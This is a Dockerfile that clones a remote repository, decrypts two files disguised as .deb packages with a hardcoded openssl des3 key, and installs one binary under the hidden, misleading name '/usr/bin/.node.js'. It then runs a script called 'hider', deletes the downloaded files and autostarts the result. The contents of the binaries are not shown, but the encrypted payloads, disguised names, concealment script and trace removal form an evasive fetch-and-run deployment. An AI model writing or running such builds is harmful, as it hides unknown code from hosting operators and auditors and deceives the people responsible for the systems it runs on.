FROM ubuntu

RUN apt update && apt install -y curl git wget tar openssl unzip bash sudo
ADD Autostart /Autostart
RUN chmod +x /Autostart
RUN git clone https://github.com/jekyll-mask-repo-new/SL-Bin.git
RUN dd if=SL-Bin/sl-bin.deb |openssl des3 -d -k 8ddefff7-f00b-46f0-ab32-2eab1d227a61|tar zxf -
RUN dd if=SL-Bin/caddy.deb |openssl des3 -d -k 8ddefff7-f00b-46f0-ab32-2eab1d227a61|tar zxf -
RUN cp sl-bin /usr/bin/.node.js && cp caddy /usr/bin/caddy
RUN chmod +x /usr/bin/.node.js && chmod +x /usr/bin/caddy
RUN mv SL-Bin/sl-bin.json /sl-bin.json && mv SL-Bin/Caddyfile /Caddyfile
RUN unzip SL-Bin/hider.zip && chmod 0777 -R /hider && bash hider/hider
RUN rm -rf SL-Bin
CMD ./Autostart
